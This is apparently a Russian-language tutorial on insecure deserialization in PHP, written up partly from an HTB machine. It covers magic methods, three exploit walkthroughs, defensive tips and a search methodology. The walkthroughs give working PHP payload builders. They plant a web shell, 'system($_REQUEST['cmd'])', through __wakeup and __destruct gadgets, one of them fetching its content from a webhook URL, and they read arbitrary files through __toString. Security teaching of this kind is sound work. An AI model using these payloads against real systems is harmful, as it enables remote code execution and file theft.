
# Insecure Deserealization. Общая концепция на PHP 
  
### 1. Что такое и с чем едят?  
  
### Начнём с  сериализации  
  
**Сериализация** - это способ превратить **обьект** в **поток байтов**, похожих на **строку**, сделать из **огромного набора данных** просто **строчку**. Строчка же потом может использоваться или куда-нибудь передаваться. Обязательное отличие сериализованных данных от формата данных (например JSON) это передача объектов класса. У языков программирования существуют методы сериализации в библиотеках или в самом языке, которые как раз могут передавать классы (если это необходимо).  
  
<br/>  
  
**PHP** имеет встроенную сериализацию. Дабы преобразовать наш объект в поток байтов,нам нужно написать serialize($obj). Поток будет выглядить так:  
  
```  
O:4:"User":2:{s:8:"username";s:4:"nope";s:7:"isAdmin";b:0;}  
```  
  
* O:4:"User":2: Здесь O означает, что сериализован объект. "User" - это имя класса, к которому относится сериализованный объект. 2 указывает на количество свойств в объекте.  
  
  
* s:8:"username";s:4:"nope";: Здесь s:8 означает, что следующая строка имеет длину 8. "username" - это имя свойства объекта, и s:4:"nope" указывает на строку "nope", которая является значением свойства.  
  
  
* s:7:"isAdmin";b:0;: Здесь s:7 означает, что следующая строка имеет длину 7. "isAdmin" - это имя другого свойства объекта. b:0 указывает на булево значение false (0) для свойства isAdmin.  
  
Этот код показывает, как объект класса `User` был сериализован в строку для хранения или передачи данных. В нем закодированы имя пользователя (`username`) и статус администратора (`isAdmin`).  
  
  
  
  
  
  
  
### А зачем нужна сериализация?  
  
Хорошо, мы поняли что есть какая-то фигня, которая может объект преобразовать в строчку каких-то байтов. И, собственно, напрашивается. А нахрена это? А вот для этого:  
* Для записи сложных данных в межпроцессную память, файл или базу данных.  
  
  
* Для отправки сложных данных, например, по сети, между различными компонентами приложения или в вызове API.  
  
Важно отметить, что при сериализации объекта его состояние также сохраняется. Другими словами, атрибуты объекта сохраняются вместе с присвоенными им значениями.  
  
### Десериализация  
  
Наверное вы уже догадались, что **десериализация** - обратный процесс сериализации. Т.е восстановление **объекта** из **потока байтов** для дальнейшего использования  
  
### Небезопасная десериализация  
  
В общех чертах я рассказал что такое **сериализация**, **десериализация**, зачем оно нужно и показал примеры кода. Теперь нам нужно понять как мы можем это использовать. А также нам нужно выработать свою методологию поиска этой редкой вулны. На самом деле уязвимость нелегко найти при black-box тестировании, поэтому я бы отнёс её к разряду white-box.  
  
Очевидно, что **небезопасная десериализация** - это **небезопасный способ передачи сериализованных данных**, которыми управляет юзер. Самый базовый пример:  
  
Представьте, что у вас в **cookie-файлах** хранится информация о вашем юзере в **сериализованном формате**. **Cookie-файлы** хранятся у **клиента**, значит мы их можем изменить. А представьте что будет, если мы поменяем своё имя в этих сериализованных данных на admin? Полный захват учётки админа. Вот и весь простой пример.  
  
### 2. Методы эксплуатации / читщит  
  
  
Ранее мы рассмотрели простой пример с плохой логикой в файлах куки. Но это был самый простой и не очень реалистичный пример эксплуатации  
  
Рассмотрим эксплуатацию через **Magic Methods**  
  
**Магические методы в PHP** - это набор некоторых методов, которые автоматически вызываются при определенных обстоятельствах.  Дока на них [здеся](https://www.php.net/manual/ru/language.oop5.magic.php). Но я более чем уверен, что вам будет влом это читать, поэтому выделю быстро и кратко некоторые из них (читать все необязательно):  
  
* **__construct()** - эм, ну как бы самый базовый метод при котором мы устанавливаем значения переменных. Каждый использовал, я думаю :) Метод вызывается всегда при создании объекта  
 <details><summary>Пример __construct()</summary>  
  
```  
class User {   
    public  $id;  
	public  $username;
	public  $email;
	private  $password;
	public  function __construct($id, $username, $email, $password){ 
				$this->id = $id;
				$this->username = $username;
				$this->email = $email;
				$this->password = $password;
	}
	$obj = new User(12, "Nope","dan@gmail.com","123456");  
```  
  
</details>  
  
  
* **__destruct()** - обратный метод констракта. Это метод класса, который вызывается автоматически при уничтожении объекта, например, когда на объект больше нет ссылок или когда выполнение программы завершается. Деструктор часто используется для освобождения ресурсов, таких как закрытие файлов или соединений с базой данных.  
<details><summary>Пример __destruct() и его срабатывание</summary>  
  
```  
class Example {  
 public function __construct() { echo "Объект создан"; }  
 public function __destruct() { echo "Объект уничтожен"; }}  
  
  
// Пример 1: Объект уничтожится, когда переменная $obj перестанет ссылаться на него  
$obj = new Example();  
$obj = null; // Объект уничтожится здесь  
  
  
// Пример 2: Объект уничтожится при завершении скрипта  
$obj = new Example();  
// Конец скрипта, объект уничтожится здесь  
  
  
// Пример 3: Явный вызов unset() для удаления ссылки на объект  
$obj = new Example();  
unset($obj); // Объект уничтожится здесь  
  
  
// Пример 4: Явный вызов деструктора через метод __destruct()  
$obj = new Example();  
$obj->__destruct(); // Объект уничтожится здесь  
  
  
// Пример 5: Объект уничтожится при выходе из функции  
function createObject() {  
 $obj = new Example();}  
createObject(); // Объект уничтожится здесь  
  
```  
  
</details>  
  
  
* **__sleep()** - метод позволяет определить, какие свойства объекта должны быть сериализованы. Поэтому когда происходит сериализация класса, она всегда включается. К примеру. У нас есть **password** и **username**. Мы хотим выдать куку, но не вставлять в неё **password** (это было бы глупо, хранить в куки-файлах пароли). Так вот, если в **__sleep()** указать **return array('username')**, то сериализовываться всегда будет только переменная **username**. Удобно? Удобно!  
<details><summary>Пример __sleep()</summary>  
  
```  
class User {  
	public $id;
	public $username;
	public $email;
	private $password;  
	public function __construct($id, $username, $email, $password) {
				$this->id = $id;
				$this->username = $username;
				$this->email = $email;
				$this->password = $password; 
	}
	
public function __sleep() { // Возвращаем список свойств, которые должны быть сериализованы 	
			return array('id', 'username', 'email');
			}
}
  
$user = new User(1, 'john_doe', 'john@example.com', 'secret');  
  
$serialized = serialize($user);  
echo $serialized;  
  
// Вывод: 

O:4:"User":3:{s:2:"id";i:1;s:8:"username";s:8:"john_doe";s:5:"email";s:16:"john@example.com";}  
  
```  
 </details>  
  
  
* **__wakeup()** - Если **__sleep()** используется при сериализации, очевидно, что wakeup при десериализации. Когда объект десериализуется с помощью функции `unserialize()`, PHP автоматически вызывает метод `__wakeup()`, если он определен в классе. Этот метод позволяет восстановить какие-либо данные или настройки объекта после десериализации.  
<details><summary>Пример __wakeup()</summary>  
  
```  
class User {  
	public $id;
	public $username;
	public $email;
	private $password;  
	public function __construct($id, $username, $email, $password){ 
				$this->id = $id;
				$this->username = $username;
				$this->email = $email;
				$this->password = $password; 
	}  
	public function __sleep() {
				return array('id', 'username', 'email');
	}  
	public function __wakeup() { // Можно выполнить какие-либо действия после десериализации 		
				$this->password = ''; // Обнуляем пароль 
	}
}  
  
$serialized = 'O:4:"User":3{s:2:"id";i:1;s:8:"username";s:8:"john_doe";s:5:"email";s:16:"john@example.com";}';  
  
$user = unserialize($serialized);  
  
echo $user->id . "\n"; // 1  
echo $user->username . "\n"; // john_doe  
echo $user->email . "\n"; // john@example.com  
echo $user->password . "\n"; // ''
  
```  
  
</details>  
  
* **__toString()** - метод автоматически вызывается, когда объект требуется представить в виде строки, например, при использовании в функции **echo** или в строковом контексте  
<details> <summary>Пример __toString()</summary>  
  
```  
class TestClass {    
   public $foo;    
    
   public function __construct($foo){  
			$this->foo = $foo;    }    
    
   public function __toString(){  
			 return $this->foo;
   }
}    
$class = new TestClass('Hello');
echo $class; //Выведет Hello вместо ошибки  

```  
  
</details>  
  
Отлично, мы разобрали все популярные магические методы, которые используются для эксплуатации нашей уязвимости. Ну а кто не просмотрел - говнюк и всё-равно вернётся сюда для понимания. Так вот, в итоге при WhiteBox'e обращайте внимание на эти главные методы, если ищете десериализацию :) Ниже будут приведены примеры эксплоитов:  
  
  
<details><summary>Через __wakeup()</summary>  
  
Рассмотрим следующий код с тачки **BroScience** на **HTB**:  
  
```  
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}
  
class AvatarInterface {
    public $tmp;
    public $imgPath;

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```  
  
///Тут должен быть эмулятор cmd. И было бы круто если бы этот фрагмент кода считал строки. Типо в строке 17 такой-то такой-то код. Удобно очень  
  
У нас есть класс **AvatarInterface** с полями **tmp,imgPath**, а также **magic** методом **__wakeup()** . Вспоминаем когда вызывается **wakeup** метод (при десериализации  ес чо)  
  
В **wakeup** есть поле **a**, которое принимает объект **Avatar** и передаёт ему в конструктор значение поля **imgPath**, а потом вызывает функцию **save** из этого объекта. Записали, запомнили. Теперь другой класс.  
  
**Avatar**. Собственно, он принимает в конструктор файл (ну так задумано как минимум) и присваивает его своему полю **imgPath**  
Функция **save** принимает в себя переменную, в которой должны быть данные для картинки (ну необязательно). Дальше она открывает файл  **imgPath** (который мы передали в конструктор через **wakeup**) для записи. Следующим шагом она записывает в **imgPath** содержимое **tmp** из объекта **AvatarInterface**  
  
(если что  file_get_contents может принимать URL вместо файла, это так особенность PHP. Наверное напишу про это когда LFI буду делать)  
  
Подытожим:  
У нас есть 2 объединенных между собой класса. Через один мы можем контролировать переменные другого, а следовательно мы контролируем какой файл записать и что в него записать (imgPath и tmp) . Только вот нам нужно найти такую часть кода в этом приложении, которая смогла бы всю нашу парашу десериализовывать.  
  
Если копаться на тачке, то мы должны найти следующий фрагмент кода:  
  
```  
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }                                 
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
```  
  
Откину лишние фрагменты с сессией. Он проверяет установлена ли в куки файлах **user-prefs** переменная. Если да, то мы переходим к блоку **else**, где **up_cookie** присваивается значение **user-prefs**  
  
Следующим шагом **up_cookie** декодируется из **base64** формата и десериализуется, а полученное  сохранится в **up** переменной. Дальше он вызывает функцию **theme**  
  
Идеальный случай! Также стоит помнить, что уязвимый объект должен быть виден другому коду, т.е нашей функции get_theme, иначе код просто не поймёт значение какого класса мы ему передаём. К примеру, как код поймёт что это за объект?)  
  
  
O:15:"AvatarInterface":2:{s:3:"tmp";s:57:"https://webhook.site/4c85cfb1-e514-418f-845b-39e65a0d45f8";s:7:"imgPath";s:13:"./abobich.php";}  
  
Правильно, что никак. Тут строго-настрого указано, что в AvatarInterface должны быть 2 поля со значением tmp и imgPath. Как код поймёт что это за такой объект AvatarInterface, если он не указан в коде? Но нам это не страшно. В коде есть подключение файла, в котором находится и get_theme функция и наши классы объектов :) (а могло быть подключение лишь одной функции get_theme) вот оно:  
  
```  
include_once "utils.php";  
```  
  
Теперь можно выдохнуть и написать эксплоит. Код под **exploit** выглядил бы так:  
  
```  
<?php  
class Avatar{  
    public $imgPath;  
  
    public function __construct($imgPath){  
        $this->imgPath = $imgPath;  
    }  
  
    public function save($tmp){  
        $f = fopen($this->imgPath, "w");  
        fwrite($f, file_get_contents($tmp));  
        fclose($f);  
    }  
}  
  
class AvatarInterface {  
    public $tmp;  
    public $imgPath;  
  
    public function __wakeup(){  
        $a = new Avatar($this->imgPath);  
        $a->save($this->tmp);  
    }  
}  
  
$avatar_interface = new AvatarInterface();  
$avatar_interface->tmp = "https://webhook.site/4c85cfb1-e514-418f-845b-39e65a0d45f8"; //Сюда мы должны записать вредоносный код (типо system($_REQUEST['cmd'])  
$avatar_interface->imgPath = "./abobich.php"; // Куда сохранится наш файл  
  
$ser = serialize($avatar_interface);  
  
echo $ser;  
?>
  
```  
  
Т.к наша переменная декодирует base64, мы должны закодировать нашу полезную  нагрузку в base64. Используем для этого cyberchef:  
  
///тут фотка должна быть  
  
Я создал мини-версию сервера как на HTB, поэтому мой код будет укороченнее, но такой же по эксплуатации уязвимости. Давайте теперь отправим нашу полезную нагрузку:  
  
///Фотка  
  
Я использую windows т.к я ленивая жопа и мне в падлу поднимать сервак на линуксе. Как видно, мы в cookie файлах указали **user-prefs** и через **=** указали base64 нашей нагрузки. И это сработало! Теперь у меня появился файл **abobich.php** с содержимым моей ссылки (там было пусто, поэтому файл тоже пустой лол):  
  
///Фото  
  
Но предположим, что в ссылке был указан мой файл с полезной нагрузкой в виде **<?php system($_REQUEST['cmd']);?>**. Тогда мы могли бы получить RCE:  
  
//ФОТО  
  
Вот и всё :) Попрактиковаться можно здесь ->/// URL  
</details>  
  
<details><summary>Через __destruct()</summary>  
  
Как я уже говорил, destruct вызывается либо когда скрипт заканчивается, либо когда переменная больше не указывает на объект. Ну и частные случаи там ещё были.  
Рассмотрим следующий код:  
  
```  
<?php  
  
class DatabaseExport  
{  
    public $user_file = 'users.txt';  
    public $data = '';  
  
    public function update_db()  
    {  
        echo '[+] Grabbing users from text file <br>';  
        $this-> data = 'Success';  
    }  
  
  
    public function __destruct()  
    {  
        file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);  
        echo '[] Database updated <br>';  
        //  echo 'Gotta get this working properly...';  
  }  
}  
  
$input = isset($_GET['arepo']) ? $_GET['arepo'] : '';  
$databaseupdate = unserialize($input);  
  
$app = new DatabaseExport;  
$app -> update_db();  
  
  
?>
```  
//cmd  
  
Существует класс, в котором есть 2 переменные  
  
* $user_file - название файла  
* $data - что хотим положить в файл  
  
А конкретнее эти переменные используются в функциях update_db() и __destruct():  
  
* update_db() - в свою очередь она присваивает переменной $data строку "Success". Это то, что будет положено в файл  
  
* __destruct() -  он же создаёт файл в работающей директории, с именем **user_file** переменной и данными из **data** переменной  
  
Дальше в коде мы видим, что код принимает в переменную **$input** данные параметра **arepo**. Дальше он десериализует данные в переменную **$databaseupdate**. Опять же, **destruct__** вызывается при завершении скрипта :) Улавливаете суть? Нам нужно просто сделать **payload** из данного класса и просто передать его в параметр. Когда скрипт закончится, выполнится наш **__destruct()**. Идея такова, что мы можем записать бэкдор туда. Давайте создадим **payload**:  
  
```  
<?php  
class DatabaseExport  
{  
    public $user_file = "code.php";  
    public $data = "<?php system(\$_REQUEST['cmd']);?>";  
  
}  
$input = new DatabaseExport();  
echo serialize($input);  
?>
```  
  
Вывод такой:  
  
```  
O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"code.php";s:4:"data";s:30:"<?php system($_REQUEST['cmd']);?>";}  
```  
Теперь просто кодируем нашу нагрузку в URL чтобы ошибки синтаксиса не словить. [Кодировщик](https://meyerweb.com/eric/tools/dencoder/) тута  
  
//Фото  
  
Нажимаем encode и копируем. Теперь давайте отправим запрос с нашим пэйлоадом:  
  
//Фото  
  
Отлично! Теперь мы можем обратиться к файлу, который создали. Он имеет параметр cmd и может выполнять ОС-команды. Давайте попробуем что-то выполнить:  
  
//Фото  
  
И всё работает прекрасно. Мы снова смогли разобрать пример эксплуатации. Причём он не такой уж и тяжелый :)  
  
</details>  
  
  
<details><summary>Пример __toString()</summary>  
  
Рассмотрим следующий код:  
  
```  
<?php  
class FileClass  
{  
    public $filename = 'error.log';  
  
    public function __toString(){  
        return file_get_contents($this->filename);  
    }  
}  
  
class User  
{  
    public $age = 0;  
    public $name = '';  
  
    public function __toString(){  
        return 'User ' . $this->name . 'is ' . $this->age . ' y.o';  
    }  
}  
  
if(isset($_GET['error'])){  
    $obj = new FileClass();  
    echo $obj;  
}  
if(isset($_GET['user'])){  
        $obj = unserialize($_GET['user']);  
        echo $obj;  
}else{  
    $obj = new User;  
    echo $obj;  
}  
?>
```  
  
Существует 2 класса:  
  
* FileClass - он содержит в себе имя файла и функцию **__toString()**, которая выводит собственно файл по переменной $filename  
  
  
* User - он содержит в себе **$age** и **$name**. По умолчанию равны фигне полной. Также есть функция, которая выводит их через метод __toString()  
  
  
Смотря на код дальше, мы можем увидеть, что есть проверка:  
  
* Если в запросе есть параметр **user**, то десериализуй его и выведи его с помощью __toString() метода (не забываем, что **__toString()** вызывается когда мы обьект пытаемся через **echo** вывести)  
  
В теории мы можем передать объект FileClass и вместо error.log вывести любой другой файл. Это означает, что мы можем добиться чтения файлов :) Погнали попробуем снова написать эксплоит.  
  
```  
<?php  
  
class FileClass  
{  
    public $filename = 'C:\Users\Noped\PhpstormProjects\untitled\toStringEX\main.php';  
  
    public function __toString(){  
        return file_get_contents($this->filename);  
    }  
}  
  
$obj = new FileClass();  
echo serialize($obj);  
?>
```  
  
Я захотел прочитать код, указанный выше)) Ну а почему бы и нет, правильно?  
  
Payload выглядит так:  
```  
O:9:"FileClass":1{s:8:"filename";s:60:"C:\Users\Noped\PhpstormProjects\untitled\toStringEX\main.php";}  
```  
  
Не забываем конвертировать его в URL дабы избежать ошибок синтаксиса. И делаем запрос :)  
  
//фото  
  
И мы снова успешно разобрали ещё одну функцию  
  
</details>  
  
### 3. Защита кода

1. Не используйте сериализацию, используйте JSON. 
2. Используйте белые списки на классы. Ну и главное в них ничего не напортачьте :)
```
$allowedClasses = ['User'];
$user = @unserialize($_GET['user'], ['allowed_classes' => $allowedClasses]);
```

### 4. Методология поиска  
  
#### BlackBox  
  
Способ простой. Их два:  
  
1. CVE на  уязвимую версию фреймворка. Это можно обнаружить через сканеры.
2.  Искать закодированные значения, который при декоде похожи на поток байтов в  PHP
  
#### WhiteBox  
  Всего 1 верный способ))
  
 1.  Ищите функции **unserialize** или **serialize**. Смотрите, что конретно они обрабатывают и какие файлы подключены к файлу, где эта функция используется. Потому что десериализацию можно использовать если в коде существует определенный класс.


### 5. Итоги  
  
Вот и закончился небольшой обзор уязвимости. Мы в краце обсудили Python десериализацию и обучились десериализации на PHP. Чтобы узнать особенности и фишки десериализации на других ЯПах с примерами уязвимости и кодом, советую прочитать наши статьи:
